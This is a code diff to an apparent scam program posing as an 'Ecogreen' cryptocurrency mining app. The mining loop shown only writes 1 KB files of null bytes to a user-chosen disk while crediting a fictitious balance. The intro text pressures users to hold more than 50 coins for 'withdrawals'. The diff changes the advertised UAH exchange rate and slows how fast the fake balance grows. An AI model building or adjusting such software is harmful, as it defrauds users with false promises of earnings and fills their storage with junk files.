@@ -41,7 +41,7 @@ def display_intro():
     Welcome to the official Ecogreen mining application!
     Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
     By default, 10 files are created per second, earning 0.001 Ecogreen per second.
-    Current rate: 10 UAH = 1 Ecogreen.
+    Current rate: 230 UAH = 1 Ecogreen.
     Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
     Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
     Version: {APP_VERSION}
@@ -96,7 +96,7 @@ def mine_ecogreen(disk_letter):
             f.write(b"\x00" * 1024) 
 
         file_count += 1
-        if file_count % 100 == 0:
+        if file_count % 500 == 0:
             balance += 0.01  
             uah_balance = balance * 230.0  
 
